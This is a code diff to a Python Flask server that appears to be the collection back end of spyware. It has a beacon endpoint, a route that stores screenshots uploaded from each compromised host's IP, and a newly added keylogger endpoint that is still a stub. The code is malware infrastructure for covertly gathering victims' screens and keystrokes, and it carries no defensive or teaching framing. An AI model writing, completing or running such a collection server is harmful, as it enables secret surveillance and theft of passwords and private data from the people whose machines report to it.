@@ -14,6 +14,16 @@ app.config['UPLOAD_FOLDER'] = 'uploads/'
 app.config['ALLOWED_EXTENSIONS'] = {'png', 'jpg'}
 
 
+def start_server(ip, port):
+    """
+    start the server
+    :param ip: interface to host on
+    :param port: port to host on
+    :return: None
+    """
+    app.run(host=ip, port=port)
+
+
 @app.route("/conn")
 @app.route("/conn/")
 def beacon_handler():
@@ -28,7 +38,8 @@ def beacon_handler():
 @app.route("/screen/<host>/", methods=['POST'])
 def screenshot_handler(host):
     """
-    handle screenshot uploads
+    Handler for screenshot uploads
+    :param host: ip of reporter
     :return:  "invalid" if failed, "success" if successful
     """
     # set upload folder to hostname
@@ -42,7 +53,7 @@ def screenshot_handler(host):
             file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
 
             # update database and return success
-
+            # TODO: UPDATE DATABASE
             return "success"
 
         # fail if file type not allowed
@@ -50,3 +61,14 @@ def screenshot_handler(host):
 
     except:
         return "invalid"
+
+
+@app.route("/key/<host>", methods=['POST'])
+@app.route("/key/<host>/", methods=['POST'])
+def keylog_handler(host):
+    """
+    Handler for keylogger data, line by line
+    :param host: ip of reporter
+    :return:
+    """
+    return "failed"
